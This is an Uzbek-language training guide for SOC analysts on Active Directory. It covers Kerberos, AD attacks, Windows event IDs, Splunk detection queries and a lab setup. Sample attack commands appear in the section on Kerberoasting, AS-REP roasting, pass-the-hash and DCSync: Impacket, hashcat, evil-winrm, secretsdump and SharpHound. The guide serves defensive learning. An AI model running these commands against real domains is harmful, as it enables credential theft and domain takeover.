# Active Directory — SOC Analyst uchun

## Active Directory nima?

Active Directory (AD) — Microsoft'ning markazlashgan identifikatsiya va kirish boshqaruvi tizimi. 95%+ korporativ muhitlarda ishlatiladi. SOC Analitik uchun AD hujumlarini tushunish — majburiy ko'nikma.

## Asosiy Tushunchalar

```
Forest (O'rmon)
└── Domain (Domen) — company.local
    ├── Organizational Units (OU) — IT, HR, Finance
    │   └── Users (Foydalanuvchilar)
    │   └── Computers (Kompyuterlar)
    │   └── Groups (Guruhlar)
    └── Domain Controllers (DC) — markaziy server
```

### Muhim Komponentlar

| Komponent | Tavsif |
|-----------|--------|
| Domain Controller (DC) | AD ma'lumotlar bazasini saqlaydi |
| LDAP | AD bilan muloqot protokoli (port 389/636) |
| Kerberos | Autentifikatsiya protokoli (port 88) |
| DNS | AD o'z DNS sini ishlatadi |
| SMB | Fayl ulashish (port 445) |
| RPC | Uzoqdan protsedura chaqirish |

## Kerberos — Autentifikatsiya

```
1. Foydalanuvchi → KDC (AS-REQ) — "Login qilmoqchiman"
2. KDC → Foydalanuvchi (AS-REP) — TGT beradi
3. Foydalanuvchi → KDC (TGS-REQ) — "Bu xizmatga kirmoqchiman" + TGT
4. KDC → Foydalanuvchi (TGS-REP) — Service Ticket beradi
5. Foydalanuvchi → Server — Service Ticket bilan kiradi
```

### Kerberos Xato Kodlari (Log tahlilida muhim)

| Kod | Ma'nosi | Hujum belgisi? |
|-----|---------|----------------|
| 0x6 | Username yo'q | Brute force |
| 0x12 | Hisob bloklangan | Brute force |
| 0x17 | Parol muddati o'tgan | — |
| 0x18 | Parol noto'g'ri | Brute force |
| 0x25 | Vaqt farqi katta | — |

## AD ga Asoslangan Hujumlar

### 1. Password Spraying
Ko'p username + bitta parol (lockout dan qochish):
```
admin : Summer2024!
user1 : Summer2024!
user2 : Summer2024!
```
**Event ID:** 4625 (ko'p, turli username, bitta parol)

### 2. Kerberoasting
Service Account parolini offline brute force qilish:
```bash
# Impacket bilan
GetUserSPNs.py domain/user:pass -dc-ip 10.10.10.1 -request

# Hashcat bilan crack
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
**Event ID:** 4769 (Kerberos service ticket so'rovi)

### 3. AS-REP Roasting
Pre-auth o'chirilgan foydalanuvchilar uchun:
```bash
GetNPUsers.py domain/ -usersfile users.txt -dc-ip 10.10.10.1
```
**Event ID:** 4768 (AS-REQ pre-auth yo'q)

### 4. Pass the Hash (PtH)
NTLM hash bilan autentifikatsiya:
```bash
evil-winrm -i 10.10.10.1 -u admin -H "aad3b435..."
```
**Event ID:** 4624 (Logon Type 3, NtLmSsp)

### 5. Pass the Ticket (PtT)
Kerberos TGT/TGS ticket o'g'irlash va ishlatish.
**Event ID:** 4768, 4769 bilan g'ayrioddiy manba IP

### 6. DCSync
DC dan parol hashlarini tortib olish:
```bash
secretsdump.py domain/admin:pass@dc-ip
```
**Event ID:** 4662 (Directory Service Object Access)

### 7. Golden Ticket
KRBTGT account hashi bilan istalgan TGT yaratish — eng xavfli!
**Aniqlash:** 4769 — RC4 encryption + g'ayrioddiy hisoblar

### 8. BloodHound — Attack Path tahlil
```bash
# SharpHound bilan ma'lumot yig'ish
SharpHound.exe -c All

# BloodHound da tahlil qilish
# Find Shortest Paths to Domain Admins
```

## SOC: AD Monitoring

### Muhim Event IDlar

```
Autentifikatsiya:
4624 — Muvaffaqiyatli login
4625 — Muvaffaqiyatsiz login
4634 — Logout
4648 — Aniq credential bilan login (RunAs)
4768 — Kerberos TGT so'rovi
4769 — Kerberos Service Ticket so'rovi
4771 — Kerberos pre-auth muvaffaqiyatsiz

Hisob boshqaruvi:
4720 — Yangi foydalanuvchi yaratildi
4722 — Hisob yoqildi
4723 — Parol o'zgartirildi
4724 — Admin parol reset qildi
4725 — Hisob o'chirildi
4726 — Foydalanuvchi o'chirildi
4728 — Security guruhiga qo'shildi
4732 — Local guruhga qo'shildi
4740 — Hisob bloklandi

Privileged Access:
4672 — Admin huquqlar bilan login
4673 — Maxsus huquqlar ishlatildi
4697 — Yangi xizmat o'rnatildi

Directory Service:
4662 — DS ob'ektiga amal bajarildi (DCSync!)
4663 — Ob'ektga kirish
5136 — DS ob'ekti o'zgartirildi
```

### SIEM/Splunk Qoidalar

```
# Password Spraying aniqlash
index=windows EventCode=4625 
| stats count by src_ip, TargetUserName 
| where count > 5
| stats dc(TargetUserName) as users by src_ip 
| where users > 10

# Kerberoasting aniqlash
index=windows EventCode=4769 TicketEncryptionType=0x17
| stats count by src_ip, ServiceName
| where count > 5

# DCSync aniqlash
index=windows EventCode=4662
| where Properties="*1131f6aa*" OR Properties="*1131f6ad*"
| table _time, SubjectUserName, ObjectDN
```

## Muhim AD Buyruqlar (Blue Team)

```powershell
# Barcha foydalanuvchilar
Get-ADUser -Filter * -Properties *

# Admin guruh a'zolari
Get-ADGroupMember "Domain Admins"

# So'nggi 7 kunda yaratilgan hisoblar
$date = (Get-Date).AddDays(-7)
Get-ADUser -Filter {Created -gt $date} -Properties Created

# Parol muddati o'tgan hisoblar
Search-ADAccount -PasswordExpired

# Bloklangan hisoblar
Search-ADAccount -LockedOut

# Kerberoastable foydalanuvchilar
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Pre-auth o'chirilgan
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

## Lab Muhiti Sozlash

```
Tavsiya etilgan lab:
1. VirtualBox / VMware
2. Windows Server 2019/2022 — Domain Controller
3. Windows 10/11 — Domain kompyuter
4. Kali Linux — hujum mashinasi

Resurslar:
- GOAD (Game of Active Directory) — hazır lab
- DetectionLab — SIEM bilan to'liq muhit
- TryHackMe "Attacking Active Directory"
- HackTheBox "Offshore" Pro Lab
```
